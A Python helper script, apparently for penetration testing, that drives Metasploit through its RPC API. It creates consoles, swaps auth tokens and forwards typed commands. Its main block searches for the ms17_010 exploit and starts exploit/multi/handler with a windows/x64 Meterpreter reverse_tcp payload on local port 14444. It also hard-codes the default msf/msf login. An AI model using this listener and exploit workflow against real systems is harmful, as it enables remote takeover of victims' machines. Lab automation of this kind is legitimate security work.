# from login import msf_login
from msfapi.login import msf_login
id =0
host="127.0.0.1"
port="55552"
user="msf"
password="msf"

#此库对获取的信息进一步处理

#get_tmptoken获取临时tokent
#get_token 获取当前token



#传入对象 对象为有这个token的链接 obj为有密码 ，有地址的的对象，他可以创建console，做各种事情
#不同对象的区别可能就是token不同 连接不同 状态不同（开没开始） 
#一个对象通过一个token进行通信

def get_console(obj):
    id=obj.console_create().get(b'id').decode()
    return id

def get_idlist(obj):
    res=obj.console_list()
    
    #res是字典类型，里面有几个有id的控制台

def get_data(query,obj,id):

    write= obj.console_write(id,query)
    res=obj.console_read(id)
    
    data=res[b"data"].decode()
    
    print(data)
    return data


def convert_list(listbyte):
    a=[]
    for item in listbyte:
        a.append(item.decode())
    return a

def get_tokenlist(obj):
    res=obj.token_list()
    data=res[b'tokens']
    data=convert_list(data)
    print(data)
    return data
    #返回的是一个列表

#单token时可以用此切换token

def get_longtoken(obj,long_token):
    obj.get_tmptoken()            #获取临时token
    tmptoken=obj.get_token()    
    obj.token_add(long_token)   #添加持久token
    obj.token_set(long_token)   #设置持久token
    obj.token_remove(tmptoken)  #去除临时token

def change_longtoken(obj,newtoken):
    oldtoken=obj.get_token()    #获取旧token
    obj.token_add(newtoken)     #添加新的
    obj.token_set(newtoken)     #设置新token
    obj.token_remove(oldtoken)  #删除旧token


def convert(data):
    """
    对Bytes类型的dict进行转化，转化为项为Str类型
    """
    if isinstance(data, bytes):  return data.decode('ascii')
    if isinstance(data, dict):   return dict(map(convert, data.items()))
    if isinstance(data, tuple):  return map(convert, data)
    return data



def get_consolelist(obj):
    data=[]
    res=obj.console_list()
    list=res[b'consoles']
    for item in list:
        element =convert(item)

        data.append(element)
    print(data)
    return data
    #返回这样一个数据


def get_sessionlist(obj):
    pass

def get_consolestatus():
    pass


if __name__=="__main__":
    #初始化一个基本对象 有用户密码有
    obj=msf_login( host, port, user, password)
    #开始 连接并 获取token

    token="newtoken"
    id=9
    #使用持久token通信
    obj.connect()
    obj.token_set(token)
   
    #用临时token登录
    # obj.msf_start()
    # print(obj.get_token())
    # obj.token_add("helloworld")

    # obj.token_set("helloworld")
    print("当前token为",end=" ")
    print(obj.get_token())

    #创建一个console并返回id
    # id=get_console(obj)#或则传入一个id
    print("当前id为",end=" ")
    print(id,end="\n")


    # change_longtoken(obj,"newtoken")
    get_data("search ms17_010\n",obj,id)
    print("有下面一些token\n")
    get_tokenlist(obj)
    print("当前存活的控制台\n")
    get_consolelist(obj)
    get_data("use exploit/multi/handler \n ",obj,id)
    get_data("set payload windows/x64/meterpreter/reverse_tcp_rc4 \n ",obj,id)
    get_data("set lhost 127.0.0.1",obj,id)
    get_data("set lport 14444",obj,id)
    get_data("run",obj,id)

    
    # rp=obj.session_list()
    # print(rp)
    



    obj1=msf_login( host, port, user, password)
    obj1.msf_start()
    obj1.token_set(token)
    i=0
    id1=get_console(obj1)
    while(1):
        
        i=i+1
        print("第%d 次输入"%i)

        userin=input("msf >")
        if userin=='q':
            break
        elif userin=="consolelist":
            get_consolelist(obj1)
            pass
        elif userin=="":
            pass
        else:
            userin=userin+'\n'
            get_data(userin,obj1,id1);
            pass



def test(query):
    obj=msf_login( host, port, user, password)
    query=""
    #开始 连接并 获取token
    token="helloworld"
    id=9
    #使用持久token通信
    obj.connect()
    obj.token_set(token)
    query=query+"\n"
    data= get_data(query,obj,id)
    return data